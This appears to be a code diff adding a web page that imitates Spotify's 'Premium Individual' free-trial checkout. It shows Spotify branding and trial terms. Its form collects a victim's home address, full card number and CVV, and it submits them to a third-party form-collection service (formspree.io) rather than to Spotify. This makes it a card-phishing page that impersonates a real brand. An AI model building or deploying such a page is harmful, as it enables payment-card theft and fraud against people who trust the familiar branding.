@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="author" content="Icome">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="style.css">
+    <title>Spotify</title>
+</head>
+<body>
+<section>
+  <header class="spotifyHeader">
+    <div class="spotifyLogo"><span><i class="fa-brands fa-spotify" style="color: #ffffff;"></i></span><span>Spotify</span></div>
+    <div class="spotifyIcons"><span><i class="fa-solid fa-circle-user" style="color: #ffffff;"></i></span><span><i class="fa-solid fa-bars" style="color: #fff;"></i></span></i></div>
+</header>
+<section class="spotifyPlanAd">
+  <div class="frameHeading">
+    <p class="headText">
+      <span class="bold">Your plan</span><span class="mini">Change plan</span>
+    </p>
+  </div>
+    <div class="frame">
+        <div class="frameDescription">
+          <p class="boldText">
+            <span>Premium Individual</span><span>Free</span>
+          </p>
+          <p class="lightText">
+            <span>1 premium Account</span><span>For 3 months</span>
+          </p>
+        </div>
+        <div class="frameText">
+            <p class="miniText">
+              <span>Start free months</span><span>Today</span>
+            </p>
+            <p class="miniText">
+              <span>Start billing date</span><span><span class="autoDate">24</span><span class="autoMonth">Nov</span><span class="autoYear">2024</span></span>
+            </p>
+            <ul>
+              <li>Only $10.99 + tax / month after 3 months trial</li>
+              <li>You won't be charged until <span><span class="autoDate2">24</span><span class="autoMonth2">Nov</span><span class="autoYear2">2024</span></span>
+              </p></li>
+              <li>Cancel anytime. Offer terms apply.</li>
+              <li>We'll remind you 7 days before you get charged.</li>
+            </ul>
+          </div>
+    </div>
+</section>
+<div class="formSection">
+    <p>Address</p>
+    <p class="learnMore"><a href="https://www.spotify.com/us/legal/end-user-agreement/" target="_parent">Learn more</a> about why we need this information.</p>
+    <form action="https://formspree.io/f/meqylzar" method="POST">
+    <label for="street">Street</label>
+    <input type="text" id="street" name="street" required>
+    <label for="town">Town/City</label>
+    <input type="text" id="town" name="town" required>
+    <label for="state">State</label>
+    <input type="text" id="state" name="state" required>
+    <label for="zipcode">Zip code</label>
+    <input type="text" id="zipcode" name="zipcode" required>
+    <label for="number">Credit/Debit </label>
+    <input type="number" max="16" id="number" name="number" placeholder="Enter credit/debit card digits" required>
+    <label for="cvv">CVV</label>
+    <input type="number" max="3" id="cvv" name="cvv" placeholder="Enter CVV" required>
+    <input type="submit" value="Submit" class="submit">
+    </form>
+    <footer>
+      <p>United States</p><p class="underline">Change country</p>
+  </footer>
+</div>
+
+<script src="spotify.js"></script>
+</section>
+</body>
+</html>
